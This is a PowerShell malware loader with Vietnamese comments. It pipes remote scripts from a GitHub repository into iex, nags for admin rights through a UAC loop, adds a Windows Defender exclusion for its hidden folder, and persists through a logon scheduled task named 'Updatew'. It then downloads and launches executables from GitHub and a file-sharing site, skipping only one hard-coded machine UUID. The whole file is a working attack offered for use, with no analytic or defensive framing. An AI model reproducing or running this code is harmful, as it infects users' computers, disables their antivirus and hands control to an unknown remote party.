iex (iwr -uri "https://raw.githubusercontent.com/43a1723/test/main/Extras/hidden.ps1" -useb)
iex (iwr -uri "https://raw.githubusercontent.com/43a1723/test/main/Extras/vm.ps1" -useb)
$dir = "$env:userprofile\150F4013"
New-Item -ItemType Directory -Path $dir

$temp = "$dir\temp"
New-Item -ItemType Directory -Path $temp

Invoke-WebRequest -Uri "https://raw.githubusercontent.com/43a1723/test/main/run.cmd" -OutFile "$temp\run.cmd"
$startupFolder = [System.IO.Path]::Combine($env:APPDATA, "Microsoft\Windows\Start Menu\Programs\Startup")

if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    $sourceFile = "$temp\run.cmd"
    Copy-Item -Path $sourceFile -Destination $startupFolder -Force
    while(1){try{Start-Process -Verb RunAs -FilePath '$temp\run.cmd';exit}catch{}}
}

$destinationFile = [System.IO.Path]::Combine($startupFolder, "run.cmd")
Remove-Item -Path $destinationFile -Force

Add-MpPreference -ExclusionPath $dir


schtasks.exe /Create /SC ONLOGON /TN Updatew /TR "$temp\run.cmd" /RL HIGHEST /F







Invoke-WebRequest -Uri "https://raw.githubusercontent.com/43a1723/test/main/siuu.exe" -OutFile "$dir\remote.exe"

Get-ChildItem -Path $dir | Where-Object { $_.PSIsContainer -eq $false } | ForEach-Object {
    Write-Output $_.FullName
    Start-Process -FilePath $_.FullName
}


# Lấy UUID của máy tính
$uuid = (Get-WmiObject -Class Win32_ComputerSystemProduct).UUID

# UUID mà bạn muốn kiểm tra
$blockedUUID = "4C4C4544-0050-3110-8051-C6C04F344632"

# So sánh UUID
if ($uuid -eq $blockedUUID) {
    Write-Host "UUID của máy tính bị chặn. Không thực hiện hành động."
} else {
    # Nếu UUID không khớp, tải và chạy tập tin
    $temp = [System.IO.Path]::GetTempPath()
    Invoke-WebRequest -Uri "https://anonsharing.com/file/f92fcbba333c5a03/fix.exe" -OutFile "$temp\skid.exe"
    Start-Process -FilePath "$temp\skid.exe"
}

